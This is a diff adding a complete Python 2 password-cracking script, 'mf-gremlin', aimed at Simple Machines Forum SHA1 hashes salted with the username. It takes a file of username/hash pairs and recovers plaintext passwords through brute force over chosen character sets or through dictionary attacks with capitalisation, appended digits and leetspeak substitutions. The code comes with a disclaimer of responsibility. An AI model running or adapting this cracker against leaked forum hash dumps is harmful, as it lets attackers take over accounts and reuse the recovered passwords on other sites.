@@ -1,0 +1,242 @@
+#!/bin/env python
+# script:  mf-gremlin v1.0
+# created: 2014
+# description:
+#   A Simple Machines Forum sha1 password cracker. Based loosly on the script
+#   written in 2009 by 0x90. The author of this script is not responsible for
+#   how you choose to use it.
+
+from os import path
+from sys import argv, exit
+import profile
+from argparse import ArgumentParser
+from hashlib  import sha1
+from itertools import (chain, ifilter, product, imap)
+from string import (letters, printable, lowercase,
+                        uppercase, digits, punctuation)
+
+def get_input(prompt, validator, numeric=False):
+
+    while True:
+        clear()
+        titlebar(prompt.count('\n'))
+        print prompt
+        user_input = raw_input(': ').strip().lower()
+        if numeric:
+            try:
+                user_input = int(user_input)
+            except ValueError:
+                print 'Input must be numeric.'
+                continue
+
+        if validator(user_input):
+            return user_input
+
+def clear():
+
+    print '\n' * 100
+
+def titlebar(heightOfContent):
+
+    print '='*80
+    print '||'+'sfm-gremlin'.center(76, ' ')+'||'
+    print '='*80
+    print (10-heightOfContent) * '\n'
+
+def setup():
+
+    configs = {}
+
+    configs['input_file'] = argv[1]
+
+    # set the mode
+    # set the mode
+    configs['mode'] = get_input('\n - bruteforce\n - dictionary\n'+\
+                            '\nSelect an attack method from the list above.',
+                                lambda x : x in ('dictionary', 'bruteforce'))
+
+    # mode specific configurations
+    if configs['mode'] == 'bruteforce':
+        configs['rmin']  = get_input('Please enter minimum password length.',
+                                lambda x : x >= 0, numeric=True)
+
+        configs['rmax']  = get_input('Please enter maximum password length.',
+                                lambda x : x >= configs['rmin'], numeric=True)
+    
+        configs['charset'] = get_input(' - all\n - alnum\n - alpha\n'+\
+                                ' - lower\n - upper\n - digit\n - symbol\n'+\
+                                    '\nSelect a charset from the list above.',
+                                        lambda x : x in ( 'symbol', 'digit',
+                                             'upper', 'lower','alpha',
+                                                    'alnum', 'all'))
+    else:
+        configs['intensity']  = get_input(' - normal\n - intense\n - insane'+\
+                                    '\nSelect an attack intensity from the '+\
+                                        'list above.', lambda x : x in ('normal',
+                                            'intense', 'insane'))
+
+        configs['wordlist'] = get_input('Please enter the name of the'+\
+                                    ' wordlist file you wish to use.',
+                                        lambda x : path.isfile(x))
+    return configs
+
+    
+def bruteforce(username, hashh, rmax, rmin ,charset):
+
+    charsets = {
+        'all'     : printable,
+        'alnum'   : lowercase+uppercase+digits,
+        'alpha'   : lowercase+uppercase,
+        'lower'   : lowercase,
+        'upper'   : uppercase,
+        'digit'   : digits,
+        'symbol'  : punctuation
+    } 
+
+    rmin = int(rmin)
+    rmax = int(rmax)+1
+    charset = charsets[charset]
+
+    for attempt in (''.join(candidate)
+                    for candidate in chain.from_iterable(product(
+                    charset, repeat=i) for i in xrange(rmin, rmax))):
+
+        #print attempt, len(attempt)
+        #print username,len(username)
+        #print sha1(username+attempt).hexdigest()
+        if sha1(username+attempt).hexdigest() == hashh:
+            return attempt
+
+    return None
+
+def dictionary_normal(wordlist, hashh, username):
+
+    with open(wordlist, 'r') as input_handle:
+
+        for line in input_handle:
+            word = line.strip()
+
+            if sha1(username+word).hexdigest() == hashh:
+                return word
+    
+            if sha1(username+word[0:1].upper()+word[1:]).hexdigest() == hashh:
+                return word[0:1].upper()+word[1:]
+
+    return None
+
+def dictionary_intense(wordlist, hashh, username):
+
+    with open(wordlist, 'r') as input_handle:
+
+        for line in input_handle:
+            word = line.strip()
+    
+            if sha1(username+word).hexdigest() == hashh:
+                return word
+    
+            Word = word[0:1].upper()+word[1:]
+            if sha1(username+Word).hexdigest() == hashh:
+                return Word
+        
+            for attempt in (''.join(candidate)
+                            for candidate in chain.from_iterable(product(
+                            digits, repeat=i) for i in xrange(0, 5))):
+           
+                if sha1(username+word+attempt).hexdigest() == hashh:
+                    return word+attempt
+
+                if sha1(username+Word+attempt).hexdigest() == hashh:
+                    return Word+attempt
+
+    return None
+
+def dictionary_insane(wordlist, hashh, username):
+
+    subs = {
+        'a' : ['a', '@'],
+        'e' : ['e', '3'],
+        'i' : ['i', '1'],
+        's' : ['s', 'z'],
+        'o' : ['o', '0']
+    }
+
+    with open(wordlist, 'r') as input_handle:
+
+        for line in input_handle:
+            word = line.strip()
+
+            tryme = [c if c not in subs.keys() else subs[c] for c in word]
+
+
+            for attempt in product(*tryme):
+
+                word = ''.join(attempt)
+
+                if sha1(username+word).hexdigest() == hashh:
+                    return word
+    
+
+                Word = word[0:1].upper()+word[1:]
+                if sha1(username+Word).hexdigest() == hashh:
+                    return Word
+        
+
+                for attempt in (''.join(candidate)
+                                for candidate in chain.from_iterable(product(
+                                digits, repeat=i) for i in xrange(0, 5))):
+           
+                    if sha1(username+word+attempt).hexdigest() == hashh:
+                        return word+attempt
+
+                    if sha1(username+Word+attempt).hexdigest() == hashh:
+                        return Word+attempt
+    return None
+
+if __name__  == '__main__':
+
+    if len(argv) != 2:
+        print 'Usage: ./smf-gremlin <input file>'
+        exit()
+    
+
+    configs = setup()
+
+    # load function upfront to avoid unnecessary
+    # comparisons as we iterate through the input file
+    if configs['mode'] == 'bruteforce':
+        cracker = bruteforce
+
+    else:
+        if configs['intensity'] == 'normal':
+            cracker = dictionary_normal
+
+        elif configs['intensity'] == 'intense':
+            cracker = dictionary_intense
+
+        else:
+            cracker = dictionary_insane
+
+    successes = []
+    for username_hash in imap(lambda x : x.strip().split(' ', 1), open(configs['input_file'])):
+
+            # call the appropriate method
+            if configs['mode'] == 'bruteforce':
+                result = cracker(username_hash[0],
+                            username_hash[1],
+                            configs['rmax'],
+                            configs['rmin'],
+                            configs['charset'])
+            else:
+                result = cracker(configs['wordlist'], username_hash[1], username_hash[0])
+
+            if result is not None:
+                print 'Password found!'
+                successes.append((username_hash[0], result))
+
+    if len(successes) == 0:
+        print 'No passwords found.'
+    else:
+        print 'username', 'password'
+        for s in successes:
+            print s[0], s[1]
+
